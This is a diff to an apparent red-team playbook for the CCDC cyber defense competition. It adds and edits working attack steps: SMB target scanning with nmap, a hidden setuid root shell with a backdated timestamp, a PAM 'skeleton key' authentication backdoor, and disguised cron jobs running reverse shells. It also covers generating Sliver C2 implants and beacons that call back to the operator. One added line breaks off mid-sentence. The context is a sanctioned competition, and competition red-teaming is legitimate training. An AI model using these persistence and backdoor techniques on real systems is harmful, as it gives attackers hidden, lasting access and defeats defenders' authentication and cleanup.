@@ -6,6 +6,7 @@ pagetitle: Red Teaming for CCDC
 ## Playbook
 
 - Make sure to have a sheet with all host/shell info, so if we lose a shell we know where we lost it
+- Before competition start, have kali already hosting a Linux implant/beacon, Windows implant/beacon, and our persistence scripts/binaries. 
 - Opening Salvo:
   - Quickly nmap scan for port 445, as this will almost always be our gateway in
   - `sudo nmap -T4 -min-hostgroup 96 -p 53,445 --open {IP_range} | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > smb_ips.txt`
@@ -51,7 +52,8 @@ pagetitle: Red Teaming for CCDC
 
 **Linux:**
 - Run [linux_persistence.sh {payload_name} {optional_absolute_path_to_payload}](https://khaelkugler.com/scripts/linux_persistence.sh.txt) while hosting the payload
-  - Make sure to point the script to the correct location to pull the file from
+  - Make sure to point the script to the correct location to pull the files from
+    - Also make sure that 
 - Add SSH keys
   - `mkdir /root/.ssh` and add key to `/root/.ssh/authorized_keys`
 - Modify `/etc/passwd` and `/etc/ssh/sshd_config`
@@ -59,10 +61,15 @@ pagetitle: Red Teaming for CCDC
 - Use setuid binaries in weird locations (like a fake .kernel file):
   - `cp /bin/zsh /.kernel && chmod +sss /.kernel && touch -d "4 May 2024" /.kernel && chattr +i /.kernel`
   - `chattr` makes the file immutable (and gives ROOT a generic access denied error???)
+- Skeleton key
+  - Copy [pam_login.so](https://khaelkugler.com/scripts/pam_login.so) into `/etc/pam.d/pam_login.so`
+  - Add `auth sufficient /etc/pam.d/pam_login.so` to the top of `/etc/pam.d/common-auth`
+    - To make it so users don't have to authenticate twice with their normal password, add `try_first_pass` to the end of `auth pam_unix.so`
 - Cron jobs:
   - Make innocuous cron jobs that are just shells sending out continuous connections
   - Upload shell to `/etc/cron.hourly/locate`, `touch -d "12 Jul 2024" /etc/cron.hourly/locate` to make it non-sus, and `chattr +i /etc/cron.hourly/locate`
     - Has to start with a `#!/bin/bash`
+
 
 ## Domain Persistence
 
@@ -112,7 +119,7 @@ pagetitle: Red Teaming for CCDC
   - On the server: `new-operator --name {op_name} --lhost localhost` and `multiplayer` to enable clients
   - On the client, outside of tmux: `sliver-client import {config_file}` and `sliver-client` to join
 - `wg` can be used to start listening for incoming sessions on a sneaky wireguard udp (use mtls otherwise if we dont get a callback)
-  - **IMPORTANT!!** `evil-winrm` implants and beacons will DIE a HORRIBLE DEATH, use another method to run the implant/beacon
+  - **IMPORTANT!!** `evil-winrm` implants and beacons (and sometimes maybe `wmi-exec`?) will DIE a HORRIBLE DEATH, use another method to run the implant/beacon
 - Then, use `generate` to create implants or beacons
   - `generate --wg {our_IP} --os linux` for an implant
   - `generate beacon --wg 192.168.0.102 -j {jitter} -S {wait_seconds} --os linux` 
